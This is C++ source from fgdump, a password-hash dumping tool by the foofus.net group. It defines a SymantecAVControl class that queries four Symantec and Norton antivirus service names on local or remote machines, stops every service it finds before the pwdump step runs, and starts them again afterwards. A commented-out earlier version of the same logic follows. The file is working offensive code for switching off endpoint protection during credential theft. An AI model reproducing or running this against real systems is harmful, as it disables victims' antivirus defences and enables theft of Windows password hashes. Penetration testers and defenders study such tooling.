/******************************************************************************
fgdump - by fizzgig and the foofus.net group
Copyright (C) 2008 by fizzgig
http://www.foofus.net

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
******************************************************************************/
#include "stdafx.h"
#include "SymantecAVControl.h"
#include "AVStatus.h"
#include "ServiceControl.h"

const int ServiceNameCount = 4;
char* g_arrServers[ServiceNameCount] = {"Symantec AntiVirus", "Norton AntiVirus Auto-Protect Service", "navapsvc", "Symantec AntiVirus Client"};

SymantecAVControl::SymantecAVControl(LONG nCacheID)
{
	m_nCacheID = nCacheID;
	m_szServiceName = NULL;
}

SymantecAVControl::~SymantecAVControl()
{

}

int SymantecAVControl::GetServiceState(const char* lpszMachine)
{
	SERVICE_STATUS sStatus;
	ServiceControl sc(m_nCacheID);
	int nResult = AV_UNKNOWN;

	for (int i = 0; i < ServiceNameCount; i++)
	{
		char* szService = g_arrServers[i];
		if (sc.QueryServiceStatus(lpszMachine, szService, &sStatus) == INSTALLED)
		{
			if (sStatus.dwCurrentState == SERVICE_RUNNING)
				nResult = AV_STARTED;
			else if (sStatus.dwCurrentState == SERVICE_STOPPED)
				nResult = AV_STOPPED;
			
			break;
		}
	}

	return nResult;
}

bool SymantecAVControl::IsServiceInstalled(const char* lpszMachine)
{
	SERVICE_STATUS sStatus;
	ServiceControl sc(m_nCacheID);
	bool bServiceStopped = false;
	
	// Loop through all Symantec services and query them all
	for (int i = 0; i < ServiceNameCount; i++)
	{
		char* szService = g_arrServers[i];
		if (sc.QueryServiceStatus(lpszMachine, szService, &sStatus) == INSTALLED)
		{
			bServiceStopped = true;
		}
	}

	return bServiceStopped;
}

bool SymantecAVControl::IsSpecificServiceInstalled(const char* lpszMachine, const char* szServiceName)
{
	SERVICE_STATUS sStatus;
	ServiceControl sc(m_nCacheID);
	bool bServiceStopped = false;

	if (sc.QueryServiceStatus(lpszMachine, szServiceName, &sStatus) == INSTALLED)
	{
		return true;
	}

	return false;
}

bool SymantecAVControl::StopService(const char* lpszMachine)
{
	bool bServiceStopped = false;
	ServiceControl sc(m_nCacheID);

	// Loop through all Symantec services and stop them all
	
	for (int i = 0; i < ServiceNameCount; i++)
	{
		if (IsSpecificServiceInstalled(lpszMachine, g_arrServers[i]))
		{
			if (sc.StopService(lpszMachine, g_arrServers[i], 30))
			{
				Log.CachedReportError(m_nCacheID, INFO, "Stopped Symantec service \"%s\" successfully\n", g_arrServers[i]);
				bServiceStopped = true;
			}
		}
	}
	
	if (!bServiceStopped)
	{
		Log.CachedReportError(m_nCacheID, CRITICAL, "Unable to stop any Symantec services, see previous errors for details. Stopping pwdump.\n");
		return false;
	}

	return bServiceStopped;
}

bool SymantecAVControl::StartService(const char* lpszMachine)
{
	bool bServiceStarted = false;
	ServiceControl sc(m_nCacheID);

	// Loop through all Symantec services and stop them all
	
	for (int i = 0; i < ServiceNameCount; i++)
	{
		if (IsSpecificServiceInstalled(lpszMachine, g_arrServers[i]))
		{
			if (sc.StartService(lpszMachine, g_arrServers[i], 30))
			{
				Log.CachedReportError(m_nCacheID, INFO, "Started Symantec service \"%s\" successfully\n", g_arrServers[i]);
				bServiceStarted = true;
			}
		}
	}
	
	if (!bServiceStarted)
	{
		Log.CachedReportError(m_nCacheID, CRITICAL, "Unable to start any Symantec services, see previous errors for details. Stopping pwdump.\n");
		return false;
	}

	return bServiceStarted;
}

/*SymantecAVControl::SymantecAVControl(LONG nCacheID)
{
	m_nCacheID = nCacheID;
	m_szServiceName = NULL;
}

SymantecAVControl::~SymantecAVControl()
{

}

int SymantecAVControl::GetServiceState(const char* lpszMachine)
{
	SERVICE_STATUS sStatus;
	ServiceControl sc(m_nCacheID);
	int nResult = AV_UNKNOWN;

	if (sc.QueryServiceStatus(lpszMachine, m_szServiceName, &sStatus) == INSTALLED)
	{
		if (sStatus.dwCurrentState == SERVICE_RUNNING)
			nResult = AV_STARTED;
		else if (sStatus.dwCurrentState == SERVICE_STOPPED)
			nResult = AV_STOPPED;
	}
	else
	{
		nResult = AV_UNKNOWN;
	}

	return nResult;
}

bool SymantecAVControl::IsServiceInstalled(const char* lpszMachine)
{
	SERVICE_STATUS sStatus;
	ServiceControl sc(m_nCacheID);

	m_szServiceName = "Norton AntiVirus Auto-Protect Service";

	if (sc.QueryServiceStatus(lpszMachine, m_szServiceName, &sStatus) == INSTALLED)
	{
		return true;
	}
	else
	{
		m_szServiceName = "Symantec AntiVirus";
		if (sc.QueryServiceStatus(lpszMachine, m_szServiceName, &sStatus) == INSTALLED)
		{
			return true;
		}
		else
		{
			m_szServiceName = "navapsvc";
			if (sc.QueryServiceStatus(lpszMachine, m_szServiceName, &sStatus) == INSTALLED)
			{
				return true;
			}
			else
			{
				return false;
			}
		}
	}
}

bool SymantecAVControl::StopService(const char* lpszMachine)
{
	ServiceControl sc(m_nCacheID);

	if (sc.StopService(lpszMachine, m_szServiceName, 120))
	{
		Log.CachedReportError(m_nCacheID, INFO, "Stopped Norton AV successfully\n");
		return true;
	}
	else
	{
		Log.CachedReportError(m_nCacheID, CRITICAL, "Unable to stop Norton AV, see previous errors for details. Stopping pwdump.\n");
		return false;
	}
}

bool SymantecAVControl::StartService(const char* lpszMachine)
{
	ServiceControl sc(m_nCacheID);

	if (sc.StartService(lpszMachine, m_szServiceName, 120))
	{
		Log.CachedReportError(m_nCacheID, INFO, "Started Norton AV successfully\n");
		return true;
	}
	else
	{
		Log.CachedReportError(m_nCacheID, CRITICAL, "Unable to start Norton AV, see previous errors for details.\n");
		return false;
	}
}
*/